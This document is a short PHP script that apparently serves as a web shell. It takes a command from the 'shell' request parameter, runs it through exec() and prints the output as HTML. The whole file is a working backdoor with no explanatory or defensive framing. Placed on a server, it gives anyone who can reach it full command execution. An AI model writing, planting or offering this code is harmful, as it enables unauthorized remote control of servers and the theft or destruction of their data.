<?php
$cmd = $_REQUEST["shell"];
exec($cmd, $out);
foreach ($out as $line){
	echo "$line <br>";
}
?>